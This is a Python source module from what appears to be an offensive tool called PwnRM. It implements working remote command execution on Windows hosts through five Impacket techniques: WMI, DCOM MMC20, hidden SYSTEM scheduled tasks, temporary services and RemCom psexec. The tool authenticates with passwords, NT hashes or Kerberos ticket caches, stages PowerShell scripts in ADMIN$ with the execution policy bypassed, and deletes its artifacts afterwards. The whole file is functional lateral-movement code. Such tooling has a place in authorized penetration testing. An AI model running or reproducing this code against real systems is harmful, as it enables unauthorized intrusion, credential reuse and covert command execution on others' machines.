"""Impacket-backed command transports used when MS-PSRP/WinRM is unavailable.

The backends in this module deliberately expose the small ``Runspace``
interface consumed by :class:`pwnrm.shell.pwnshell.PwnShell`.  They are not
persistent PowerShell runspaces: every command is executed by a fresh
``powershell.exe`` process and the working directory is carried between
invocations by the adapter.
"""

from __future__ import annotations

import base64
import logging
import os
import re
import secrets
import socket
import string
import time
from contextlib import contextmanager
from dataclasses import dataclass
from html import escape as xml_escape
from io import BytesIO
from typing import Any, Generator
from urllib.parse import urlparse

from impacket import smb
from impacket.dcerpc.v5 import scmr, transport as dcerpc_transport, tsch
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcom.oaut import (
    IID_IDispatch,
    IDispatch,
    DISPPARAMS,
    DISPATCH_METHOD,
    DISPATCH_PROPERTYGET,
    VARIANT,
    VARENUM,
    string_to_bin,
)
from impacket.dcerpc.v5.dcomrt import (
    DCOMConnection,
    OBJREF,
    OBJREF_CUSTOM,
    OBJREF_HANDLER,
    OBJREF_EXTENDED,
    OBJREF_STANDARD,
    FLAGS_OBJREF_CUSTOM,
    FLAGS_OBJREF_HANDLER,
    FLAGS_OBJREF_EXTENDED,
    FLAGS_OBJREF_STANDARD,
    IRemUnknown2,
    INTERFACE,
)
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import (
    RPC_C_AUTHN_GSS_NEGOTIATE,
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
)
from impacket.examples import remcomsvc, serviceinstall
from impacket.smbconnection import SMBConnection
from impacket.structure import Structure

from .credentials import KrbCredential, NTCredential


EMPTY_LM_HASH = "aad3b435b51404eeaad3b435b51404ee"
REMOTE_METHODS = ("wmiexec", "dcomexec", "atexec", "smbexec", "psexec")


class RemoteExecError(RuntimeError):
    """Raised when no requested remote execution backend can be used."""


def tcp_reachable(host: str, port: int, timeout: float = 1.5) -> bool:
    """Return whether a TCP endpoint can be reached within a short deadline."""
    try:
        with socket.create_connection((host, port), timeout=max(0.1, timeout)):
            return True
    except OSError:
        return False


@dataclass(frozen=True)
class _Auth:
    host: str
    username: str
    password: str
    domain: str
    lmhash: str = ""
    nthash: str = ""
    kerberos: bool = False
    ccache: str = ""

    @classmethod
    def from_transport(cls, pwnrm_transport: Any) -> "_Auth":
        parsed = urlparse(str(getattr(pwnrm_transport, "url", "")))
        host = parsed.hostname or ""
        creds = getattr(pwnrm_transport, "creds", None)
        if not host:
            raise RemoteExecError("remote execution fallback could not resolve the target host")
        if isinstance(creds, KrbCredential):
            if not creds.ccache:
                raise RemoteExecError("Kerberos fallback requires a usable FILE ccache")
            # Kerberos service lookup is hostname-sensitive.  Operators often
            # invoke PwnRM with a short hostname while the delegated ticket (and
            # DNS) use the domain-qualified name, as Impacket's exec examples do.
            if "." not in host and "." in creds.domain:
                host = f"{host}.{creds.domain}".rstrip(".")
            return cls(
                host=host,
                username=creds.username,
                password=creds.password,
                domain=creds.domain,
                kerberos=True,
                ccache=creds.ccache.removeprefix("FILE:"),
            )
        if isinstance(creds, NTCredential):
            return cls(
                host=host,
                username=creds.username,
                password=creds.password,
                domain=creds.domain,
                lmhash=EMPTY_LM_HASH if creds.nt_hash else "",
                nthash=creds.nt_hash,
            )
        raise RemoteExecError(
            "this authentication method cannot be reused by WMI/SMB remote execution; "
            "use Kerberos, a password, or an NT hash"
        )

    @contextmanager
    def ccache_environment(self):
        previous = os.environ.get("KRB5CCNAME")
        if self.kerberos:
            os.environ["KRB5CCNAME"] = self.ccache
        try:
            yield
        finally:
            if previous is None:
                os.environ.pop("KRB5CCNAME", None)
            else:
                os.environ["KRB5CCNAME"] = previous

    def configure_rpc(self, rpc_transport: Any) -> None:
        if hasattr(rpc_transport, "set_credentials"):
            rpc_transport.set_credentials(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                None,
            )
        rpc_transport.set_kerberos(self.kerberos, None)

    def connect_smb(self, timeout: int) -> SMBConnection:
        connection = SMBConnection(
            self.host,
            self.host,
            timeout=max(5, int(timeout)),
        )
        try:
            with self.ccache_environment():
                if self.kerberos:
                    connection.kerberosLogin(
                        self.username,
                        self.password,
                        self.domain,
                        self.lmhash,
                        self.nthash,
                        useCache=True,
                    )
                else:
                    connection.login(
                        self.username,
                        self.password,
                        self.domain,
                        self.lmhash,
                        self.nthash,
                    )
            connection.setTimeout(max(10, int(timeout)))
            return connection
        except Exception:
            try:
                connection.logoff()
            except Exception:
                pass
            raise


class _Backend:
    name = "remote"
    required_ports = (445,)

    def __init__(self, auth: _Auth, timeout: int):
        self.auth = auth
        self.timeout = max(1, int(timeout))
        self.smb: SMBConnection | None = None

    def connect(self) -> None:
        raise NotImplementedError

    def launch(self, command: str) -> None:
        raise NotImplementedError

    def close(self) -> None:
        if self.smb is not None:
            try:
                self.smb.logoff()
            except Exception:
                pass
            self.smb = None

    def _delete(self, relative_path: str) -> None:
        if self.smb is None:
            return
        try:
            self.smb.deleteFile("ADMIN$", relative_path)
        except Exception:
            pass

    def cleanup_stale(self, minimum_age: int = 300) -> None:
        """Remove abandoned PwnRM command files without touching live sessions."""
        if self.smb is None:
            return
        pattern = re.compile(r"pwnrm_[0-9a-f]{20}\.(?:ps1|out)\Z", re.IGNORECASE)
        now = time.time()
        try:
            entries = self.smb.listPath("ADMIN$", r"Temp\pwnrm_*")
        except Exception:
            return
        for entry in entries:
            try:
                name = entry.get_longname()
                age = now - float(entry.get_mtime_epoch())
                if not entry.is_directory() and pattern.fullmatch(name) and age >= minimum_age:
                    self._delete(f"Temp\\{name}")
            except Exception:
                continue

    def _read_output(self, relative_path: str, footer: bytes) -> bytes:
        if self.smb is None:
            raise RemoteExecError(f"{self.name} has no authenticated SMB output channel")
        deadline = time.monotonic() + self.timeout
        last_error: Exception | None = None
        last_data = b""
        while time.monotonic() < deadline:
            chunks: list[bytes] = []
            try:
                self.smb.getFile("ADMIN$", relative_path, chunks.append)
                last_data = b"".join(chunks)
                if footer in last_data:
                    return last_data
            except Exception as exc:
                last_error = exc
                message = str(exc).upper()
                transient = (
                    "STATUS_OBJECT_NAME_NOT_FOUND" in message
                    or "STATUS_SHARING_VIOLATION" in message
                    or "STATUS_NO_SUCH_FILE" in message
                )
                if not transient:
                    raise
            time.sleep(0.2)
        detail = f": {last_error}" if last_error and not last_data else ""
        raise TimeoutError(
            f"{self.name} command did not complete within {self.timeout}s{detail}"
        )

    def execute(self, script: str, footer: str) -> bytes:
        """Stage one PowerShell script, execute it, read its output, and clean up."""
        if self.smb is None:
            raise RemoteExecError(f"{self.name} is not connected")
        token = secrets.token_hex(10)
        script_name = f"pwnrm_{token}.ps1"
        output_name = f"pwnrm_{token}.out"
        script_relative = f"Temp\\{script_name}"
        output_relative = f"Temp\\{output_name}"
        # Windows PowerShell 5.1 needs a BOM to unambiguously read UTF-8 source.
        payload = b"\xef\xbb\xbf" + script.encode("utf-8")
        try:
            self.smb.putFile("ADMIN$", script_relative, BytesIO(payload).read)
            command = (
                "cmd.exe /Q /D /C powershell.exe -NoLogo -NoProfile -NonInteractive "
                "-ExecutionPolicy Bypass -File "
                f"%SystemRoot%\\Temp\\pwnrm_{token}.ps1 "
                f"1> %SystemRoot%\\Temp\\pwnrm_{token}.out 2>&1"
            )
            self.launch(command)
            return self._read_output(output_relative, footer.encode("ascii"))
        finally:
            self._delete(output_relative)
            self._delete(script_relative)


class _WMIBackend(_Backend):
    name = "wmiexec"
    required_ports = (135, 445)

    def __init__(self, auth: _Auth, timeout: int):
        super().__init__(auth, timeout)
        self._dcom: DCOMConnection | None = None
        self._process: Any = None

    def connect(self) -> None:
        self.smb = self.auth.connect_smb(self.timeout)
        try:
            with self.auth.ccache_environment():
                self._dcom = DCOMConnection(
                    self.auth.host,
                    self.auth.username,
                    self.auth.password,
                    self.auth.domain,
                    self.auth.lmhash,
                    self.auth.nthash,
                    None,
                    oxidResolver=True,
                    doKerberos=self.auth.kerberos,
                    kdcHost=None,
                    remoteHost=self.auth.host,
                )
                interface = self._dcom.CoCreateInstanceEx(
                    wmi.CLSID_WbemLevel1Login,
                    wmi.IID_IWbemLevel1Login,
                )
                login = wmi.IWbemLevel1Login(interface)
                services = login.NTLMLogin("//./root/cimv2", NULL, NULL)
                login.RemRelease()
                self._process, _ = services.GetObject("Win32_Process")
        except Exception:
            self.close()
            raise

    def launch(self, command: str) -> None:
        if self._process is None:
            raise RemoteExecError("WMI Win32_Process is not connected")
        response = self._process.Create(command, "C:\\Windows\\System32", None)
        try:
            return_value = int(response["ReturnValue"])
        except (KeyError, TypeError):
            properties = response.getProperties()
            return_value = int(properties["ReturnValue"]["value"])
        if return_value != 0:
            raise RemoteExecError(f"Win32_Process.Create failed with ReturnValue={return_value}")

    def close(self) -> None:
        try:
            if self._dcom is not None:
                self._dcom.disconnect()
        except Exception:
            pass
        self._dcom = None
        self._process = None
        super().close()


class _DCOMExecBackend(_Backend):
    """Execute through MMC20.Application's DCOM ExecuteShellCommand method."""

    name = "dcomexec"
    required_ports = (135, 445)

    def __init__(self, auth: _Auth, timeout: int):
        super().__init__(auth, timeout)
        self._dcom: DCOMConnection | None = None
        self._mmc: Any = None
        self._quit_id: Any = None
        self._active_view: Any = None
        self._execute_id: Any = None

    @staticmethod
    def _interface(parent: Any, response_data: Any) -> IRemUnknown2:
        raw = b"".join(response_data)
        objref_type = OBJREF(raw)["flags"]
        objref_classes = {
            FLAGS_OBJREF_CUSTOM: OBJREF_CUSTOM,
            FLAGS_OBJREF_HANDLER: OBJREF_HANDLER,
            FLAGS_OBJREF_EXTENDED: OBJREF_EXTENDED,
            FLAGS_OBJREF_STANDARD: OBJREF_STANDARD,
        }
        objref_class = objref_classes.get(objref_type)
        if objref_class is None:
            raise RemoteExecError(f"unsupported DCOM OBJREF type 0x{int(objref_type):x}")
        objref = objref_class(raw)
        return IRemUnknown2(
            INTERFACE(
                parent.get_cinstance(),
                None,
                parent.get_ipidRemUnknown(),
                objref["std"]["ipid"],
                oxid=objref["std"]["oxid"],
                oid=objref["std"]["oxid"],
                target=parent.get_target(),
            )
        )

    @staticmethod
    def _empty_params() -> DISPPARAMS:
        params = DISPPARAMS(None, False)
        params["rgvarg"] = NULL
        params["rgdispidNamedArgs"] = NULL
        params["cArgs"] = 0
        params["cNamedArgs"] = 0
        return params

    @staticmethod
    def _bstr(value: str) -> VARIANT:
        variant = VARIANT(None, False)
        variant["clSize"] = 5
        variant["vt"] = VARENUM.VT_BSTR
        variant["_varUnion"]["tag"] = VARENUM.VT_BSTR
        variant["_varUnion"]["bstrVal"]["asData"] = value
        return variant

    def connect(self) -> None:
        self.smb = self.auth.connect_smb(self.timeout)
        try:
            with self.auth.ccache_environment():
                self._dcom = DCOMConnection(
                    self.auth.host,
                    self.auth.username,
                    self.auth.password,
                    self.auth.domain,
                    self.auth.lmhash,
                    self.auth.nthash,
                    None,
                    oxidResolver=True,
                    doKerberos=self.auth.kerberos,
                    kdcHost=None,
                    remoteHost=self.auth.host,
                )
                interface = self._dcom.CoCreateInstanceEx(
                    string_to_bin("49B2791A-B1AE-4C90-9B8E-E860BA07F889"),
                    IID_IDispatch,
                )
                self._mmc = IDispatch(interface)
                params = self._empty_params()
                document_id = self._mmc.GetIDsOfNames(("Document",))[0]
                response = self._mmc.Invoke(
                    document_id,
                    0x409,
                    DISPATCH_PROPERTYGET,
                    params,
                    0,
                    [],
                    [],
                )
                document = IDispatch(
                    self._interface(
                        self._mmc,
                        response["pVarResult"]["_varUnion"]["pdispVal"]["abData"],
                    )
                )
                active_id = document.GetIDsOfNames(("ActiveView",))[0]
                response = document.Invoke(
                    active_id,
                    0x409,
                    DISPATCH_PROPERTYGET,
                    params,
                    0,
                    [],
                    [],
                )
                self._active_view = IDispatch(
                    self._interface(
                        self._mmc,
                        response["pVarResult"]["_varUnion"]["pdispVal"]["abData"],
                    )
                )
                self._execute_id = self._active_view.GetIDsOfNames(("ExecuteShellCommand",))[0]
                self._quit_id = self._mmc.GetIDsOfNames(("Quit",))[0]
        except Exception:
            self.close()
            raise

    def launch(self, command: str) -> None:
        if self._active_view is None or self._execute_id is None:
            raise RemoteExecError("MMC20 DCOM object is not connected")
        executable = "cmd.exe"
        arguments = command[len("cmd.exe "):] if command.lower().startswith("cmd.exe ") else f"/Q /D /C {command}"
        params = self._empty_params()
        params["cArgs"] = 4
        params["rgvarg"].append(self._bstr("7"))
        params["rgvarg"].append(self._bstr(arguments))
        params["rgvarg"].append(self._bstr("C:\\Windows\\System32"))
        params["rgvarg"].append(self._bstr(executable))
        self._active_view.Invoke(
            self._execute_id,
            0x409,
            DISPATCH_METHOD,
            params,
            0,
            [],
            [],
        )

    def close(self) -> None:
        if self._mmc is not None and self._quit_id is not None:
            try:
                self._mmc.Invoke(
                    self._quit_id,
                    0x409,
                    DISPATCH_METHOD,
                    self._empty_params(),
                    0,
                    [],
                    [],
                )
            except Exception:
                pass
        try:
            if self._dcom is not None:
                self._dcom.disconnect()
        except Exception:
            pass
        self._dcom = None
        self._mmc = None
        self._active_view = None
        self._execute_id = None
        self._quit_id = None
        super().close()


class _RPCBackend(_Backend):
    pipe = ""
    interface: Any = None
    auth_level: int | None = None
    configure_dce_auth = False

    def __init__(self, auth: _Auth, timeout: int):
        super().__init__(auth, timeout)
        self.rpc_transport: Any = None
        self.dce: Any = None

    def connect(self) -> None:
        binding = rf"ncacn_np:{self.auth.host}[\pipe\{self.pipe}]"
        self.rpc_transport = dcerpc_transport.DCERPCTransportFactory(binding)
        self.rpc_transport.setRemoteHost(self.auth.host)
        self.auth.configure_rpc(self.rpc_transport)
        self.dce = self.rpc_transport.get_dce_rpc()
        try:
            if self.configure_dce_auth and hasattr(self.dce, "set_credentials"):
                self.dce.set_credentials(*self.rpc_transport.get_credentials())
            if self.configure_dce_auth and self.auth.kerberos:
                self.dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            with self.auth.ccache_environment():
                self.dce.connect()
                if self.auth_level is not None:
                    self.dce.set_auth_level(self.auth_level)
                self.dce.bind(self.interface)
            self.smb = self.rpc_transport.get_smb_connection()
            self.smb.setTimeout(max(10, self.timeout))
        except Exception:
            self.close()
            raise

    def close(self) -> None:
        try:
            if self.dce is not None:
                self.dce.disconnect()
        except Exception:
            pass
        self.dce = None
        self.rpc_transport = None
        # The SMB object belongs to the RPC transport and is disconnected with it.
        self.smb = None


class _SMBExecBackend(_RPCBackend):
    name = "smbexec"
    pipe = "svcctl"
    interface = scmr.MSRPC_UUID_SCMR

    def __init__(self, auth: _Auth, timeout: int):
        super().__init__(auth, timeout)
        self._manager: Any = None

    def connect(self) -> None:
        super().connect()
        response = scmr.hROpenSCManagerW(self.dce)
        self._manager = response["lpScHandle"]

    def launch(self, command: str) -> None:
        if self._manager is None:
            raise RemoteExecError("Service Control Manager is not connected")
        service_name = f"PwnRM{secrets.token_hex(4)}"
        batch_path = f"%SystemRoot%\\pwnrm_{secrets.token_hex(5)}.bat"
        escaped = command.replace("^", "^^")
        for character in ("&", ">", "<", "|"):
            escaped = escaped.replace(character, f"^{character}")
        service_command = (
            f"%COMSPEC% /Q /D /C echo {escaped} > {batch_path} "
            f"& %COMSPEC% /Q /D /C {batch_path} & del /F /Q {batch_path}"
        )
        service = None
        try:
            response = scmr.hRCreateServiceW(
                self.dce,
                self._manager,
                service_name,
                service_name,
                lpBinaryPathName=service_command,
                dwStartType=scmr.SERVICE_DEMAND_START,
            )
            service = response["lpServiceHandle"]
            try:
                scmr.hRStartServiceW(self.dce, service)
            except Exception:
                # A normal console process does not answer the SCM dispatcher and
                # reports ERROR_SERVICE_REQUEST_TIMEOUT even though it was started.
                pass
        finally:
            if service is not None:
                try:
                    scmr.hRDeleteService(self.dce, service)
                except Exception:
                    pass
                try:
                    scmr.hRCloseServiceHandle(self.dce, service)
                except Exception:
                    pass

    def close(self) -> None:
        if self._manager is not None and self.dce is not None:
            try:
                scmr.hRCloseServiceHandle(self.dce, self._manager)
            except Exception:
                pass
        self._manager = None
        super().close()


class _ATExecBackend(_RPCBackend):
    name = "atexec"
    pipe = "atsvc"
    interface = tsch.MSRPC_UUID_TSCHS
    auth_level = RPC_C_AUTHN_LEVEL_PKT_PRIVACY
    configure_dce_auth = True

    def launch(self, command: str) -> None:
        task_name = f"\\PwnRM{secrets.token_hex(5)}"
        action = xml_escape(command, quote=True)
        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers />
  <Principals><Principal id="LocalSystem"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><Enabled>true</Enabled><Hidden>true</Hidden><AllowStartOnDemand>true</AllowStartOnDemand><ExecutionTimeLimit>PT5M</ExecutionTimeLimit></Settings>
  <Actions Context="LocalSystem"><Exec><Command>cmd.exe</Command><Arguments>/Q /D /C {action}</Arguments></Exec></Actions>
</Task>"""
        created = False
        try:
            tsch.hSchRpcRegisterTask(
                self.dce,
                task_name,
                xml,
                tsch.TASK_CREATE,
                NULL,
                tsch.TASK_LOGON_NONE,
            )
            created = True
            tsch.hSchRpcRun(self.dce, task_name)
        finally:
            if created:
                try:
                    tsch.hSchRpcDelete(self.dce, task_name)
                except Exception:
                    pass


class _RemComMessage(Structure):
    structure = (
        ("Command", '4096s=""'),
        ("WorkingDir", '260s=""'),
        ("Priority", "<L=0x20"),
        ("ProcessID", "<L=0x01"),
        ("Machine", '260s=""'),
        ("NoWait", "<L=0"),
    )


class _RemComResponse(Structure):
    structure = (("ErrorCode", "<L=0"), ("ReturnCode", "<L=0"))


class _PsExecBackend(_Backend):
    name = "psexec"

    def __init__(self, auth: _Auth, timeout: int):
        super().__init__(auth, timeout)
        self._installer: Any = None
        self._tree: Any = None

    def connect(self) -> None:
        self.smb = self.auth.connect_smb(self.timeout)
        service_name = "PwnRM" + secrets.token_hex(4)
        binary_name = "pwnrm_" + secrets.token_hex(5) + ".exe"
        self._installer = serviceinstall.ServiceInstall(
            self.smb,
            remcomsvc.RemComSvc(),
            service_name,
            binary_name,
        )
        with self.auth.ccache_environment():
            if not self._installer.install():
                self.close()
                raise RemoteExecError("RemCom service installation failed")
        self._tree = self.smb.connectTree("IPC$")

    def _open_pipe(self, path: str, access: int):
        if self.smb is None or self._tree is None:
            raise RemoteExecError("RemCom IPC channel is not connected")
        deadline = time.monotonic() + min(self.timeout, 20)
        last_error: Exception | None = None
        while time.monotonic() < deadline:
            try:
                self.smb.waitNamedPipe(self._tree, path)
                return self.smb.openFile(
                    self._tree,
                    path,
                    access,
                    creationOption=0x40,
                    fileAttributes=0x80,
                )
            except Exception as exc:
                last_error = exc
                time.sleep(0.2)
        raise RemoteExecError(f"RemCom pipe {path} did not become ready: {last_error}")

    def launch(self, command: str) -> None:
        if self.smb is None or self._tree is None:
            raise RemoteExecError("RemCom service is not connected")
        main = self._open_pipe(r"\RemCom_communicaton", 0x12019F)
        handles = [main]
        try:
            packet = _RemComMessage()
            machine = "".join(secrets.choice(string.ascii_letters) for _ in range(6))
            process_id = 1000 + secrets.randbelow((2**31 - 1) - 1000)
            packet["Machine"] = machine
            packet["WorkingDir"] = "C:\\Windows\\System32"
            packet["Command"] = command
            packet["ProcessID"] = process_id
            self.smb.writeNamedPipe(self._tree, main, packet.getData())

            # RemCom expects all three standard-stream pipes to be connected.
            handles.append(self._open_pipe(
                rf"\RemCom_stdin{machine}{process_id}",
                smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA,
            ))
            handles.append(self._open_pipe(
                rf"\RemCom_stdout{machine}{process_id}",
                smb.FILE_READ_DATA,
            ))
            handles.append(self._open_pipe(
                rf"\RemCom_stderr{machine}{process_id}",
                smb.FILE_READ_DATA,
            ))
            response = self.smb.readNamedPipe(self._tree, main, 8)
            if len(response) == 8:
                result = _RemComResponse(response)
                if int(result["ErrorCode"]) != 0:
                    raise RemoteExecError(
                        f"RemCom failed with ErrorCode={int(result['ErrorCode'])}, "
                        f"ReturnCode={int(result['ReturnCode'])}"
                    )
        finally:
            for handle in reversed(handles):
                try:
                    self.smb.closeFile(self._tree, handle)
                except Exception:
                    pass

    def close(self) -> None:
        if self._installer is not None:
            try:
                self._installer.uninstall()
            except Exception:
                pass
        self._installer = None
        self._tree = None
        super().close()


_BACKENDS = {
    "wmiexec": _WMIBackend,
    "dcomexec": _DCOMExecBackend,
    "atexec": _ATExecBackend,
    "smbexec": _SMBExecBackend,
    "psexec": _PsExecBackend,
}


class RemoteExecRunspace:
    """Stateless PowerShell adapter over common Impacket execution methods."""

    persistent = False

    def __init__(self, pwnrm_transport: Any, timeout: int = 30, method: str = "auto"):
        if method not in ("auto", *REMOTE_METHODS):
            raise ValueError(f"unsupported remote execution method: {method}")
        self._transport = pwnrm_transport
        self.timeout = max(1, int(timeout))
        self.requested_method = method
        self.backend_name = ""
        self.shell_id: str | None = None
        self.command_id: str | None = None
        self._cwd = "C:\\Windows\\System32"
        self._auth = _Auth.from_transport(pwnrm_transport)
        self._backend: _Backend | None = None

    def __enter__(self) -> "RemoteExecRunspace":
        methods = REMOTE_METHODS if self.requested_method == "auto" else (self.requested_method,)
        failures: list[str] = []
        for method in methods:
            backend_type = _BACKENDS[method]
            closed_ports = [
                port
                for port in backend_type.required_ports
                if not tcp_reachable(self._auth.host, port, min(1.5, self.timeout))
            ]
            if closed_ports:
                failures.append(f"{method}: TCP {','.join(map(str, closed_ports))} unavailable")
                continue
            backend = backend_type(self._auth, self.timeout)
            try:
                logging.info("[*] Testing %s remote execution...", method)
                backend.connect()
                backend.cleanup_stale(max(300, (self.timeout * 2) + 60))
                self._backend = backend
                self.backend_name = method
                # Authentication plus one real, bounded command proves execution
                # and output retrieval rather than merely detecting an open port.
                probe = self._execute_wrapped(
                    "[Console]::Out.WriteLine('__PWNRM_PROBE_OK__')"
                )
                if "__PWNRM_PROBE_OK__" not in probe[0] or not probe[1]:
                    raise RemoteExecError("execution probe returned no success marker")
                self.shell_id = f"{method}-{secrets.token_hex(6)}"
                logging.info(
                    "[+] Selected %s backend (stateless PowerShell fallback)",
                    method,
                )
                return self
            except Exception as exc:
                failures.append(f"{method}: {exc}")
                backend.close()
                self._backend = None
                self.backend_name = ""
                logging.debug("%s fallback failed", method, exc_info=True)
        joined = "; ".join(failures) if failures else "no candidate was attempted"
        raise RemoteExecError(f"no remote execution backend succeeded ({joined})")

    def __exit__(self, *exc) -> None:
        if self._backend is not None:
            self._backend.close()
        self._backend = None

    @staticmethod
    def _decode_output(data: bytes) -> str:
        if data.startswith((b"\xff\xfe", b"\xfe\xff")):
            return data.decode("utf-16", errors="replace")
        for encoding in ("utf-8-sig", "cp1252", "cp437"):
            try:
                return data.decode(encoding)
            except UnicodeDecodeError:
                continue
        return data.decode("utf-8", errors="replace")

    def _execute_wrapped(self, command: str) -> tuple[str, bool]:
        if self._backend is None:
            raise RemoteExecError("remote execution backend is not connected")
        token = secrets.token_hex(12)
        status_prefix = f"__PWNRM_STATUS_{token}__="
        cwd_prefix = f"__PWNRM_CWD_{token}__="
        footer = f"__PWNRM_END_{token}__"
        encoded_command = base64.b64encode(command.encode("utf-8")).decode("ascii")
        cwd = self._cwd.replace("'", "''")
        script = f"""
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Continue'
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::new($false)
$OutputEncoding = [Console]::OutputEncoding
$__pwnrmOk = $true
$__pwnrmErrorCount = $Error.Count
try {{
    Set-Location -LiteralPath '{cwd}'
    $__pwnrmText = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded_command}'))
    . ([ScriptBlock]::Create($__pwnrmText))
    $__pwnrmOk = ($? -and $Error.Count -eq $__pwnrmErrorCount)
    if ($null -ne $LASTEXITCODE -and $LASTEXITCODE -ne 0) {{ $__pwnrmOk = $false }}
}} catch {{
    $__pwnrmOk = $false
    [Console]::Error.WriteLine(($_ | Out-String))
}} finally {{
    [Console]::Out.WriteLine('{status_prefix}' + $(if ($__pwnrmOk) {{ 'ok' }} else {{ 'error' }}))
    [Console]::Out.WriteLine('{cwd_prefix}' + (Get-Location).Path)
    [Console]::Out.WriteLine('{footer}')
}}
"""
        data = self._backend.execute(script, footer)
        text = self._decode_output(data)
        output_lines: list[str] = []
        success = False
        for line in text.splitlines(keepends=True):
            plain = line.rstrip("\r\n")
            if plain.startswith(status_prefix):
                success = plain[len(status_prefix):].strip().lower() == "ok"
            elif plain.startswith(cwd_prefix):
                candidate = plain[len(cwd_prefix):].strip()
                if candidate:
                    self._cwd = candidate
            elif plain == footer:
                continue
            else:
                output_lines.append(line)
        return "".join(output_lines), success

    def run_command(self, command: str) -> Generator[dict[str, Any], None, None]:
        self.command_id = secrets.token_hex(8)
        try:
            normalized = " ".join(command.strip().lower().split())
            if normalized in {
                "get-location | select -expand path",
                "get-location | select-object -expandproperty path",
            }:
                yield {"stdout": self._cwd + "\n"}
                return
            output, success = self._execute_wrapped(command)
            if output:
                yield {"stdout": output}
            if not success:
                yield {"error": f"{self.backend_name} PowerShell command failed"}
        except Exception as exc:
            yield {"error": str(exc)}
        finally:
            self.command_id = None

    def interrupt(self) -> bool:
        # These execution protocols provide no portable per-process interrupt.
        return False
